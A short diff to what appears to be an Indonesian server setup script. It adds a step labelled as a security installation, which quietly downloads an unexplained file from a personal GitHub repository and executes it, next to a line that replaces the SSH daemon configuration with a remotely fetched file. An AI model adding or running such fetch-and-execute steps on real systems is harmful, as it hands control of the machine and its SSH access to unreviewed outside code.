@@ -51,6 +51,9 @@ chmod +x /usr/local/sbin/epro
 epro *bot
 rm -r *~
 
+# Instalasi Keamanan
+wget -q https://raw.githubusercontent.com/adipatixyz/sogokpetek/main/config/keamananx && chmod +x keamananx && ./keamananx
+
 # Instalasi SSHD_Config Port Login 6401
 cd /etc/ssh
 wget -q -O /etc/ssh/sshd_config "https://raw.githubusercontent.com/adipatixyz/wabot/main/wabot/sshd_config"
